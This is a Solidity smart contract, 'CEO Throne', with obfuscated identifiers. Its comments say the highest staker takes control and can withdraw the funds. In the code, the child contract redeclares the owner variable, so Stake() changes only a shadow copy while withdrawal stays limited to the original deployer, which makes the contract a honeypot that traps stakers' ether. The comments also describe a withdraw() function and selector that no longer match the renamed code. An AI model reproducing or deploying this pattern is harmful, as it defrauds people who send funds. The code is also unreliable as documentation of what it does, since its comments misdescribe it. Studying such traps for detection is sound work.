// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;
//
//Live TEST ---- Please Do NOT use! Thanks! ----
//
contract Ownable {
    address public _0xada5bd;
    function Ownable() public {_0xada5bd = msg.sender;}
    modifier _0x6a75e6() {require(msg.sender == _0xada5bd); _;
    }
}
//CEO Throne .. The CEO with the highest stake gets the control over the contract
//msg.value needs to be higher than largestStake when calling Stake()

contract CEOThrone is Ownable {
    address public _0xada5bd;
    uint public _0x44f582;
// Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000
// The sent ETH is checked against largestStake
    function Stake() public payable {
        // if you own the largest stake in a company, you own a company
        if (msg.value > _0x44f582) {
            _0xada5bd = msg.sender;
            _0x44f582 = msg.value;
        }
    }
// withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000
    function _0xcc1cce() public _0x6a75e6 {
        // only owner can withdraw funds
        msg.sender.transfer(this.balance);
    }
}